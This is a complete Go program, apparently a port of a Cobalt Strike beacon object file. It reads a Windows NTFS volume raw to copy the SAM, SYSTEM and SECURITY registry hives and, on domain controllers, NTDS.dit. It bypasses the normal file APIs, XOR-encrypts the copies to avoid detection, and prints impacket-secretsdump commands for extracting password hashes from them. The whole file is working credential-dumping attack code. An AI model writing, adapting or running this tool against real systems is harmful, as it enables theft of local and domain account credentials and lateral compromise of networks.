//go:build windows

// rawhive-go: standalone Windows port of the RawHive Cobalt Strike BOF.
// Pulls SAM / SYSTEM / SECURITY (and NTDS.dit on DCs) directly from a raw
// NTFS volume, bypassing the normal file APIs. Output files are XOR-encrypted.
//
// Usage: rawhive [-key <hex>] [volume] <outdir>
//
// Must run as local Administrator or SYSTEM.
package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"golang.org/x/sys/windows"
)

//  constants 

const (
	mftMagic  = 0x454C4946 // "FILE"
	indxMagic = 0x58444E49 // "INDX"

	mftInUse = 0x0001

	atAL     = 0x00000020
	atFName  = 0x00000030
	atData   = 0x00000080
	atIROOT  = 0x00000090
	atIALLOC = 0x000000A0
	atEnd    = 0xFFFFFFFF

	ieLast = 0x0002

	maxRuns = 128
)

//  context 

type ctx struct {
	vol      *os.File
	bpc      uint32 // bytes per cluster
	bps      uint32 // bytes per sector
	recSz    uint32 // MFT record size in bytes
	idxSz    uint32 // index block size in bytes
	mftLCN   [maxRuns]int64
	mftCnt   [maxRuns]uint64
	mftNRuns int
}

//  little-endian helpers 

func le16(b []byte) uint16 { return binary.LittleEndian.Uint16(b) }
func le32(b []byte) uint32 { return binary.LittleEndian.Uint32(b) }
func le64(b []byte) uint64 { return binary.LittleEndian.Uint64(b) }

func rangeOK(off, length, size uint32) bool {
	return off <= size && length <= size-off
}

//  volume I/O 

// openVolume opens a raw local volume (e.g. \\.\C:) with the share flags
// needed when the volume is mounted and in use.
func openVolume(path string) (*os.File, error) {
	p, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return nil, err
	}
	h, err := windows.CreateFile(
		p,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return nil, err
	}
	return os.NewFile(uintptr(h), path), nil
}

func volRead(vol *os.File, byteOff uint64, buf []byte) error {
	n, err := vol.ReadAt(buf, int64(byteOff))
	if err != nil {
		return err
	}
	if n != len(buf) {
		return io.ErrUnexpectedEOF
	}
	return nil
}

//  NTFS update-sequence fixup 

// applyFixup restores the original last-two-bytes of each sector that NTFS
// replaced with the update-sequence number. Must be called after reading any
// MFT record or INDX block.
func applyFixup(buf []byte, recSz, bps uint32) {
	if uint32(len(buf)) < 8 {
		return
	}
	usaOff := uint32(le16(buf[4:]))
	usaCnt := uint32(le16(buf[6:]))
	if bps == 0 || usaOff == 0 || usaCnt < 2 || usaCnt > 32 {
		return
	}
	usaLen := usaCnt * 2
	if !rangeOK(usaOff, usaLen, recSz) || uint32(len(buf)) < recSz {
		return
	}
	for i := uint32(1); i < usaCnt; i++ {
		sectorTail := i*bps - 2
		if sectorTail+2 > recSz {
			break
		}
		buf[sectorTail] = buf[usaOff+i*2]
		buf[sectorTail+1] = buf[usaOff+i*2+1]
	}
}

//  runlist decoding 

// decodeRuns parses a packed NTFS runlist into parallel slices of LCN and
// cluster-count values. Sparse runs have LCN == -1.
func decodeRuns(data []byte) (lcns []int64, cnts []uint64, err error) {
	p := 0
	var prev int64
	for p < len(data) {
		hdr := data[p]
		p++
		if hdr == 0 {
			return lcns, cnts, nil // normal terminator
		}
		if len(lcns) >= maxRuns {
			return nil, nil, fmt.Errorf("run count exceeds %d", maxRuns)
		}
		nl := int(hdr & 0x0F)       // length-field byte count
		no := int((hdr >> 4) & 0x0F) // offset-field byte count
		if nl == 0 || nl > 8 || no > 8 || p+nl+no > len(data) {
			return nil, nil, fmt.Errorf("malformed runlist entry")
		}

		var cl uint64
		for i := 0; i < nl; i++ {
			cl |= uint64(data[p]) << (i * 8)
			p++
		}

		var rawDelta uint64
		for i := 0; i < no; i++ {
			rawDelta |= uint64(data[p]) << (i * 8)
			p++
		}

		cnts = append(cnts, cl)
		if no > 0 {
			delta := int64(rawDelta)
			// Sign-extend if the high bit of the offset field is set
			if no < 8 && (rawDelta>>(no*8-1))&1 != 0 {
				delta = int64(rawDelta | (^uint64(0) << (no * 8)))
			}
			prev += delta
			lcns = append(lcns, prev)
		} else {
			lcns = append(lcns, -1) // sparse run
		}
	}
	return nil, nil, fmt.Errorf("runlist missing terminator")
}

//  MFT attribute helpers 
//
// Packed struct byte offsets used below (all little-endian):
//
// MFT_REC  (48 bytes)
//   0  DWORD  magic
//   4  WORD   usa_off
//   6  WORD   usa_cnt
//   8  UINT64 lsn
//  16  WORD   seq
//  18  WORD   links
//  20  WORD   attr_off   <- first attribute
//  22  WORD   flags      <- MFT_INUSE == 0x0001
//  24  DWORD  used
//  28  DWORD  alloc
//  32  UINT64 base_ref
//  40  WORD   next_id
//  42  WORD   pad
//  44  DWORD  rec_num
//
// ATTR_HDR (16 bytes)
//   0  DWORD type
//   4  DWORD len
//   8  BYTE  non_res
//   9  BYTE  name_len
//  10  WORD  name_off
//  12  WORD  flags
//  14  WORD  id
//
// ATTR_RES extends ATTR_HDR:
//  16  DWORD val_len
//  20  WORD  val_off
//
// ATTR_NR extends ATTR_HDR:
//  16  UINT64 start_vcn
//  24  UINT64 last_vcn
//  32  WORD   run_off
//  34  WORD   comp_unit
//  36  BYTE[4] pad
//  40  UINT64 alloc_sz
//  48  UINT64 data_sz
//  56  UINT64 init_sz
//   -> total = 64 bytes

// findAttr scans a raw MFT record for the first attribute of the given type.
// Returns the attribute bytes (including its header) or nil.
func findAttr(rec []byte, attrType uint32) []byte {
	if uint32(len(rec)) < 48 {
		return nil
	}
	attrOff := uint32(le16(rec[20:]))
	recSz := uint32(len(rec))
	for p := attrOff; p+16 <= recSz; {
		aType := le32(rec[p:])
		if aType == atEnd {
			break
		}
		aLen := le32(rec[p+4:])
		if aLen < 16 || uint64(recSz-p) < uint64(aLen) {
			break
		}
		if aType == attrType {
			return rec[p : p+aLen]
		}
		p += aLen
	}
	return nil
}

// attrResValue returns the value bytes of a resident attribute, or nil.
func attrResValue(attr []byte) []byte {
	if len(attr) < 24 || attr[8] != 0 {
		return nil
	}
	valLen := le32(attr[16:])
	valOff := uint32(le16(attr[20:]))
	aLen := le32(attr[4:])
	if !rangeOK(valOff, valLen, aLen) || uint32(len(attr)) < aLen {
		return nil
	}
	return attr[valOff : valOff+valLen]
}

// attrNRRuns returns the raw runlist bytes of a non-resident attribute, or nil.
func attrNRRuns(attr []byte) []byte {
	if len(attr) < 64 || attr[8] == 0 {
		return nil
	}
	runOff := uint32(le16(attr[32:]))
	aLen := le32(attr[4:])
	if runOff < 64 || runOff >= aLen || uint32(len(attr)) < aLen {
		return nil
	}
	return attr[runOff:aLen]
}

// attrNRDataSize returns the logical (data) size from a non-resident attribute.
func attrNRDataSize(attr []byte) uint64 {
	if len(attr) < 56 {
		return 0
	}
	return le64(attr[48:])
}

//  Unicode helpers 

// wcsicmpN compares two UTF-16LE slices case-insensitively (ASCII range only).
func wcsicmpN(a, b []uint16) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		ca, cb := a[i], b[i]
		if ca >= 'a' && ca <= 'z' {
			ca -= 32
		}
		if cb >= 'a' && cb <= 'z' {
			cb -= 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}

// toUTF16 converts an ASCII string to a []uint16 (sufficient for NTFS path
// components which are always basic Latin).
func toUTF16(s string) []uint16 {
	r := make([]uint16, len(s))
	for i := 0; i < len(s); i++ {
		r[i] = uint16(s[i])
	}
	return r
}

//  XOR encryption 

// xorStream XORs data in-place using key, starting at the given stream offset.
// off is updated so consecutive calls to xorStream on chunks of the same file
// produce a contiguous keystream.
func xorStream(data, key []byte, off *uint64) {
	klen := uint64(len(key))
	for i := range data {
		data[i] ^= key[*off%klen]
		*off++
	}
}

//  index-node scanner 
//
// IROOT_HDR (16 bytes):
//   0  DWORD attr_type
//   4  DWORD collation
//   8  DWORD blk_sz
//  12  BYTE  cpb
//  13  BYTE[3] pad
//
// INODE_HDR (16 bytes):
//   0  DWORD entry_off
//   4  DWORD used_sz
//   8  DWORD alloc_sz
//  12  BYTE  flags
//  13  BYTE[3] pad
//
// INDX_HDR: magic(4)+usa_off(2)+usa_cnt(2)+lsn(8)+vcn(8) = 24 bytes, then INODE_HDR
//
// IE_HDR (16 bytes):
//   0  UINT64 file_ref
//   8  WORD   entry_len
//  10  WORD   key_len
//  12  WORD   flags      IE_LAST == 0x0002
//  14  WORD   pad
//
// FNAME_ATTR starts immediately after IE_HDR:
//   0  UINT64 parent_ref
//   8  UINT64 created
//  16  UINT64 modified
//  24  UINT64 mft_chg
//  32  UINT64 accessed
//  40  UINT64 alloc_sz
//  48  UINT64 real_sz
//  56  DWORD  flags
//  60  DWORD  reparse
//  64  BYTE   name_len
//  65  BYTE   ns
//  66  WCHAR  name[]

const fnameBase = uint32(66) // offsetof(FNAME_ATTR, name)

// scanNode searches one INODE_HDR node for an entry whose $FILE_NAME matches
// name. nhdr is the slice starting at INODE_HDR. Returns file_ref or 0.
func scanNode(nhdr []byte, name []uint16) uint64 {
	if uint32(len(nhdr)) < 16 {
		return 0
	}
	entryOff := le32(nhdr[0:])
	usedSz := le32(nhdr[4:])
	nhdrLen := uint32(len(nhdr))
	if entryOff > usedSz || usedSz > nhdrLen {
		return 0
	}
	for p := entryOff; p+16 <= usedSz; {
		ieFileRef := le64(nhdr[p:])
		ieEntryLen := uint32(le16(nhdr[p+8:]))
		ieKeyLen := uint32(le16(nhdr[p+10:]))
		ieFlags := le16(nhdr[p+12:])

		if ieEntryLen < 16 || uint64(usedSz-p) < uint64(ieEntryLen) {
			break
		}
		if ieFlags&ieLast != 0 {
			break
		}
		if ieKeyLen >= fnameBase && ieKeyLen <= ieEntryLen-16 {
			fn := nhdr[p+16:]
			if uint32(len(fn)) < fnameBase {
				break
			}
			nameLen := int(fn[64])
			need := fnameBase + uint32(nameLen)*2
			if need > ieKeyLen {
				break
			}
			if nameLen == len(name) {
				wname := make([]uint16, nameLen)
				for i := 0; i < nameLen; i++ {
					wname[i] = le16(fn[66+i*2:])
				}
				if wcsicmpN(wname, name) {
					return ieFileRef
				}
			}
		}
		p += ieEntryLen
	}
	return 0
}

//  MFT record I/O 

func readMFTEntry(c *ctx, num uint32) ([]byte, error) {
	offInMFT := uint64(num) * uint64(c.recSz)
	vcn := offInMFT / uint64(c.bpc)
	inner := offInMFT % uint64(c.bpc)
	var curVCN uint64
	for i := 0; i < c.mftNRuns; i++ {
		runLen := c.mftCnt[i]
		if vcn >= curVCN && vcn < curVCN+runLen {
			off := uint64(c.mftLCN[i]+int64(vcn-curVCN))*uint64(c.bpc) + inner
			buf := make([]byte, c.recSz)
			if err := volRead(c.vol, off, buf); err != nil {
				return nil, err
			}
			applyFixup(buf, c.recSz, c.bps)
			return buf, nil
		}
		curVCN += runLen
	}
	return nil, fmt.Errorf("MFT entry %d not found in runlist", num)
}

//  directory lookup via $INDEX_ROOT / $INDEX_ALLOCATION 

// findInDir looks up name in the directory at MFT record dir using the NTFS
// B-tree index. Returns the file's MFT record number (48-bit) or 0.
func findInDir(c *ctx, dir uint32, name []uint16) uint32 {
	rec, err := readMFTEntry(c, dir)
	if err != nil {
		return 0
	}
	if le32(rec[0:]) != mftMagic || le16(rec[22:])&mftInUse == 0 {
		return 0
	}

	// Try $INDEX_ROOT (resident; present for all directories)
	if irAttr := findAttr(rec, atIROOT); irAttr != nil && irAttr[8] == 0 {
		val := attrResValue(irAttr)
		// val layout: IROOT_HDR (16 bytes) followed by INODE_HDR + entries
		if val != nil && len(val) >= 16+16 {
			if ref := scanNode(val[16:], name); ref != 0 {
				return uint32(ref & 0xFFFFFFFFFFFF)
			}
		}
	}

	// Try $INDEX_ALLOCATION (non-resident INDX blocks for larger directories)
	iaAttr := findAttr(rec, atIALLOC)
	if iaAttr == nil {
		// For very large directories the AT_IALLOC attribute may live in an
		// extension MFT record referenced by the $ATTRIBUTE_LIST (type 0x20).
		if alAttr := findAttr(rec, atAL); alAttr != nil && alAttr[8] == 0 {
			if lp := attrResValue(alAttr); lp != nil {
				for len(lp) >= 26 {
					et := le32(lp[0:])
					eln := uint32(le16(lp[4:]))
					fr := le64(lp[16:])
					if eln == 0 || eln < 26 {
						break
					}
					if et == atIALLOC {
						xn := uint32(fr & 0xFFFFFFFFFFFF)
						if xn != dir {
							if extRec, err2 := readMFTEntry(c, xn); err2 == nil {
								iaAttr = findAttr(extRec, atIALLOC)
								// iaAttr sub-slices extRec; GC keeps the backing
								// array alive for as long as iaAttr is live.
							}
						}
						break
					}
					lp = lp[eln:]
				}
			}
		}
	}

	if iaAttr == nil || iaAttr[8] == 0 { // must be non-resident
		return 0
	}
	runs := attrNRRuns(iaAttr)
	if runs == nil {
		return 0
	}
	lcns, cnts, err := decodeRuns(runs)
	if err != nil {
		return 0
	}

	cpi := c.idxSz / c.bpc
	if cpi == 0 {
		cpi = 1
	}
	blk := make([]byte, c.idxSz)
	for i, lcn := range lcns {
		for k := uint64(0); k < cnts[i]; k += uint64(cpi) {
			if lcn < 0 {
				continue
			}
			off := uint64(lcn+int64(k)) * uint64(c.bpc)
			if err := volRead(c.vol, off, blk); err != nil {
				continue
			}
			if le32(blk[0:]) != indxMagic {
				continue
			}
			applyFixup(blk, c.idxSz, c.bps)
			// INDX_HDR: magic(4)+usa_off(2)+usa_cnt(2)+lsn(8)+vcn(8) = 24
			const nodeOff = uint32(24)
			if nodeOff >= c.idxSz {
				continue
			}
			if ref := scanNode(blk[nodeOff:], name); ref != 0 {
				return uint32(ref & 0xFFFFFFFFFFFF)
			}
		}
	}
	return 0
}

// findInMFT is the fallback when the index lookup fails. It walks up to
// 500 000 MFT records linearly, matching by parent reference and file name.
func findInMFT(c *ctx, parent uint32, name []uint16) uint32 {
	for n := uint32(5); n < 500000; n++ {
		rec, err := readMFTEntry(c, n)
		if err != nil {
			continue
		}
		if le32(rec[0:]) != mftMagic || le16(rec[22:])&mftInUse == 0 {
			continue
		}
		attrOff := uint32(le16(rec[20:]))
		recSz := uint32(len(rec))
		for p := attrOff; p+16 <= recSz; {
			aType := le32(rec[p:])
			if aType == atEnd {
				break
			}
			aLen := le32(rec[p+4:])
			if aLen < 16 || uint64(recSz-p) < uint64(aLen) {
				break
			}
			if aType == atFName && rec[p+8] == 0 {
				val := attrResValue(rec[p : p+aLen])
				if val != nil && uint32(len(val)) >= fnameBase {
					parentRef := le64(val[0:])
					nameLen := int(val[64])
					need := int(fnameBase) + nameLen*2
					if need <= len(val) &&
						uint32(parentRef&0xFFFFFFFFFFFF) == parent &&
						nameLen == len(name) {
						wname := make([]uint16, nameLen)
						for i := 0; i < nameLen; i++ {
							wname[i] = le16(val[66+i*2:])
						}
						if wcsicmpN(wname, name) {
							return n
						}
					}
				}
			}
			p += aLen
		}
	}
	return 0
}

//  file extraction 

// extractToFile reads the file at MFT record num, XOR-encrypts it with key,
// and writes it to <outdir>\<hostname>_<ts>_<label>.tmp.
// Returns true only when every expected byte has been written.
func extractToFile(c *ctx, num uint32, label, outdir, hostname, ts string, key []byte) bool {
	rec, err := readMFTEntry(c, num)
	if err != nil {
		return false
	}
	if le32(rec[0:]) != mftMagic {
		return false
	}

	da := findAttr(rec, atData)
	if da == nil {
		return false
	}

	outpath := outdir + `\` + hostname + "_" + ts + "_" + strings.ToLower(label) + ".tmp"
	fout, err := os.Create(outpath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] open(%s) failed: %v\n", outpath, err)
		return false
	}
	defer fout.Close()

	// Resident $DATA (unusual for registry hives, but handle it correctly)
	if da[8] == 0 {
		val := attrResValue(da)
		if val == nil {
			return false
		}
		// Copy before XOR so we don't mutate the underlying MFT record buffer
		enc := make([]byte, len(val))
		copy(enc, val)
		var keyOff uint64
		xorStream(enc, key, &keyOff)
		if _, err := fout.Write(enc); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %s write failed: %v\n", label, err)
			return false
		}
		fmt.Printf("[+] %s -> %s (%d bytes, XOR encrypted)\n", label, outpath, len(enc))
		return true
	}

	// Non-resident $DATA: walk the runlist cluster by cluster
	runs := attrNRRuns(da)
	if runs == nil {
		return false
	}
	dsz := attrNRDataSize(da)
	lcns, cnts, err := decodeRuns(runs)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %s runlist: %v\n", label, err)
		return false
	}

	cbuf := make([]byte, c.bpc)
	var filled uint64
	var keyOff uint64
	ok := true

outer:
	for i, lcn := range lcns {
		for k := uint64(0); k < cnts[i] && filled < dsz; k++ {
			toRW := uint32(c.bpc)
			if filled+uint64(toRW) > dsz {
				toRW = uint32(dsz - filled)
			}
			chunk := cbuf[:toRW]

			if lcn < 0 {
				// Sparse run: fill with zeros
				for j := range chunk {
					chunk[j] = 0
				}
			} else {
				offset := uint64(lcn+int64(k)) * uint64(c.bpc)
				if err := volRead(c.vol, offset, chunk); err != nil {
					fmt.Fprintf(os.Stderr, "[-] %s read at byte %d: %v\n", label, filled, err)
					ok = false
					break outer
				}
			}

			xorStream(chunk, key, &keyOff)
			if _, err := fout.Write(chunk); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %s write at byte %d: %v\n", label, filled, err)
				ok = false
				break outer
			}
			filled += uint64(toRW)
		}
	}

	if ok && filled != dsz {
		fmt.Fprintf(os.Stderr, "[-] %s incomplete: wrote %d of %d bytes\n", label, filled, dsz)
		ok = false
	}
	if ok {
		fmt.Printf("[+] %s -> %s (%d bytes, XOR encrypted)\n", label, outpath, filled)
	} else {
		fmt.Fprintf(os.Stderr, "[-] %s failed at byte %d\n", label, filled)
	}
	return ok
}

//  main 

func main() {
	keyFlag := flag.String("key", "", "XOR key as hex string (default: random 16 bytes)")
	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, "usage: rawhive [-key <hex>] [volume] <outdir>")
		flag.PrintDefaults()
	}
	flag.Parse()
	args := flag.Args()

	var volStr, outDir string
	switch len(args) {
	case 1:
		volStr = "C"
		outDir = args[0]
	case 2:
		volStr = args[0]
		outDir = args[1]
	default:
		flag.Usage()
		os.Exit(1)
	}

	//  Resolve XOR key 

	var key []byte
	if *keyFlag != "" {
		var err error
		key, err = hex.DecodeString(*keyFlag)
		if err != nil || len(key) == 0 {
			fmt.Fprintln(os.Stderr, "[-] -key must be a non-empty hex string (e.g. -key deadbeef)")
			os.Exit(1)
		}
	} else {
		key = make([]byte, 16)
		if _, err := rand.Read(key); err != nil {
			fmt.Fprintf(os.Stderr, "[-] key generation failed: %v\n", err)
			os.Exit(1)
		}
	}
	keyHex := hex.EncodeToString(key)
	fmt.Printf("[*] XOR key: %s\n", keyHex)

	// Validate and normalise drive letter (accept "C", "c", "C:")
	vol := byte('C')
	if len(volStr) > 0 {
		vol = volStr[0]
		if vol >= 'a' && vol <= 'z' {
			vol -= 32
		}
		if vol < 'A' || vol > 'Z' {
			fmt.Fprintf(os.Stderr, "[-] invalid volume: %s\n", volStr)
			os.Exit(1)
		}
		if len(volStr) > 1 && !(len(volStr) == 2 && volStr[1] == ':') {
			fmt.Fprintf(os.Stderr, "[-] invalid volume: %s\n", volStr)
			os.Exit(1)
		}
	}

	// Validate output directory
	fi, err := os.Stat(outDir)
	if err != nil || !fi.IsDir() {
		fmt.Fprintf(os.Stderr, "[-] outdir does not exist: %s\n", outDir)
		os.Exit(1)
	}

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	hostname = strings.ToLower(hostname)

	// Unix timestamp - same value the C code produces from FILETIME
	ts := fmt.Sprintf("%d", time.Now().Unix())

	volPath := fmt.Sprintf(`\\.\%c:`, vol)
	fmt.Printf("[*] rawhive: host=%s ts=%s volume=%c: out=%s\n", hostname, ts, vol, outDir)

	volFile, err := openVolume(volPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] open %s failed: %v\n", volPath, err)
		os.Exit(1)
	}
	defer volFile.Close()

	//  Read and validate the NTFS boot sector 
	//
	// NTFS_BPB packed layout (relevant offsets):
	//  11: bps  (WORD)    bytes per sector
	//  13: spc  (BYTE)    sectors per cluster
	//  48: mft_lcn (UINT64)  LCN of $MFT
	//  64: cpr  (INT8)    clusters per MFT record  (negative -> 2^(-cpr))
	//  68: cpi  (INT8)    clusters per index block (negative -> 2^(-cpi))

	boot := make([]byte, 512)
	if err := volRead(volFile, 0, boot); err != nil {
		fmt.Fprintf(os.Stderr, "[-] boot read failed: %v\n", err)
		os.Exit(1)
	}
	if boot[3] != 'N' || boot[4] != 'T' || boot[5] != 'F' || boot[6] != 'S' {
		fmt.Fprintln(os.Stderr, "[-] not NTFS")
		os.Exit(1)
	}

	bps := uint32(le16(boot[11:]))
	if bps == 0 {
		bps = 512
	}
	spc := uint32(boot[13])
	bpc := bps * spc
	mftLCN := le64(boot[48:])
	cpr := int8(boot[64])
	cpi := int8(boot[68])

	var recSz uint32
	if cpr < 0 {
		recSz = 1 << uint(-cpr)
	} else {
		recSz = uint32(cpr) * bpc
	}
	if recSz == 0 {
		recSz = 1024
	}

	var idxSz uint32
	if cpi < 0 {
		idxSz = 1 << uint(-cpi)
	} else {
		idxSz = uint32(cpi) * bpc
	}
	if idxSz == 0 {
		idxSz = 4096
	}

	if spc == 0 || bpc == 0 || bps < 512 || bps > 4096 ||
		recSz < 48 || idxSz < 40 {
		fmt.Fprintln(os.Stderr, "[-] unsupported NTFS geometry")
		os.Exit(1)
	}

	fmt.Printf("[*] ntfs: bpc=%d rec=%d mft_lcn=%d\n", bpc, recSz, mftLCN)

	c := &ctx{vol: volFile, bpc: bpc, bps: bps, recSz: recSz, idxSz: idxSz}

	//  Bootstrap the MFT runlist from record 0 ($MFT) 

	mft0 := make([]byte, recSz)
	if err := volRead(c.vol, mftLCN*uint64(bpc), mft0); err != nil {
		fmt.Fprintf(os.Stderr, "[-] mft[0] read: %v\n", err)
		os.Exit(1)
	}
	applyFixup(mft0, recSz, bps)
	if le32(mft0[0:]) != mftMagic {
		fmt.Fprintln(os.Stderr, "[-] mft[0] bad magic")
		os.Exit(1)
	}

	mfdata := findAttr(mft0, atData)
	if mfdata == nil || mfdata[8] == 0 {
		fmt.Fprintln(os.Stderr, "[-] $mft $data missing")
		os.Exit(1)
	}
	mftRuns := attrNRRuns(mfdata)
	if mftRuns == nil {
		fmt.Fprintln(os.Stderr, "[-] $mft runlist malformed")
		os.Exit(1)
	}
	lcns, cnts, err := decodeRuns(mftRuns)
	if err != nil || len(lcns) == 0 {
		fmt.Fprintln(os.Stderr, "[-] $mft runlist malformed")
		os.Exit(1)
	}
	c.mftNRuns = len(lcns)
	for i := range lcns {
		c.mftLCN[i] = lcns[i]
		c.mftCnt[i] = cnts[i]
	}

	//  Navigate Windows\System32\config 

	lookup := func(dir uint32, name string) uint32 {
		w := toUTF16(name)
		n := findInDir(c, dir, w)
		if n == 0 {
			n = findInMFT(c, dir, w)
		}
		return n
	}

	rWin := lookup(5, "Windows") // MFT record 5 is the root directory
	if rWin == 0 {
		fmt.Fprintln(os.Stderr, "[-] Windows/ not found")
		os.Exit(1)
	}
	rS32 := lookup(rWin, "System32")
	if rS32 == 0 {
		fmt.Fprintln(os.Stderr, "[-] System32/ not found")
		os.Exit(1)
	}
	rCfg := lookup(rS32, "config")
	if rCfg == 0 {
		fmt.Fprintln(os.Stderr, "[-] config/ not found")
		os.Exit(1)
	}

	//  Extract the three registry hives 

	for _, t := range []struct{ name, label string }{
		{"SAM", "SAM"},
		{"SYSTEM", "SYSTEM"},
		{"SECURITY", "SECURITY"},
	} {
		r := lookup(rCfg, t.name)
		if r == 0 {
			fmt.Printf("[!] %s not found\n", t.label)
			continue
		}
		if !extractToFile(c, r, t.label, outDir, hostname, ts, key) {
			fmt.Fprintf(os.Stderr, "[-] %s failed\n", t.label)
		}
	}

	//  NTDS.dit (domain controllers only; silently skipped otherwise) 

	gotNTDS := false
	if rNTDS := lookup(rWin, "NTDS"); rNTDS != 0 {
		if rDit := lookup(rNTDS, "ntds.dit"); rDit != 0 {
			gotNTDS = extractToFile(c, rDit, "ntds", outDir, hostname, ts, key)
		}
	}

	//  Print key reminder + decrypt one-liner + impacket commands 

	prefix := outDir + `\` + hostname + "_" + ts
	fmt.Println("[*] done")
	fmt.Printf("[*] XOR key: %s  (save this - files are encrypted on disk)\n", keyHex)
	fmt.Printf("[*] decrypt (Python 3):\n")
	fmt.Printf("    python3 -c \"k=bytes.fromhex('%s'); [open(f,'wb').write(bytes(b^k[i%%len(k)]for i,b in enumerate(open(f,'rb').read()))) for f in ['%s_sam.tmp','%s_system.tmp','%s_security.tmp']]\"\n",
		keyHex, prefix, prefix, prefix)
	fmt.Printf("\nimpacket-secretsdump -sam %s_sam.tmp -system %s_system.tmp -security %s_security.tmp LOCAL\n",
		prefix, prefix, prefix)
	if gotNTDS {
		fmt.Printf("impacket-secretsdump -ntds %s_ntds.tmp -system %s_system.tmp LOCAL\n",
			prefix, prefix)
	}
}
